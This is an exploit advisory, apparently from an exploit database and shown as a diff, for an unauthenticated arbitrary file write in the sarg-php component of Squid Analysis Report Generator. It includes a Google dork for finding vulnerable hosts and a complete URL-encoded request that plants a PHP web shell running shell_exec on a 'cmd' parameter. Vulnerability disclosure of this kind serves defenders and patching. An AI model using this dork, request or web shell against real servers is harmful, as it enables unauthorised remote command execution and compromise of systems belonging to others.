@@ -1,0 +1,22 @@
+# Exploit Title: RCE/Arbitrary file write in Squid Analysis Report Generator (SARG)
+# Google Dork: inurl:sarg-php
+# Date: 01 September 2017
+# Exploit Author: Pavel Suprunyuk
+# Vendor Homepage: https://sourceforge.net/projects/sarg/
+# Software Link: https://sourceforge.net/projects/sarg/
+# Version: Tested on 2.3.10, other versions are vulnerable too.
+# Tested on: PHP, any OS
+# CVE : None
+
+===================================
+sarg-php/sarg-squidguard-block2.php does not require any authentication and allows to write an arbitrary file:
+
+sarg-php/sarg-squidguard-block2.php?file=<your_shell_name.php>&url=<your_php_shell_content>
+
+Exploit example:
+
+the following request
+
+http://vulnerable_site/sarg-php/sarg-squidguard-block2?file=shell.php&url=%3C%3Fphp%20if%20(isset($_GET%5B'cmd'%5D))%20echo%20shell_exec($_GET%5B'cmd'%5D)%3B%20%3F%3E
+
+will write the basic shell "<?php if (isset($_GET['cmd'])) echo shell_exec($_GET['cmd']); ?>" into the "shell.php" file
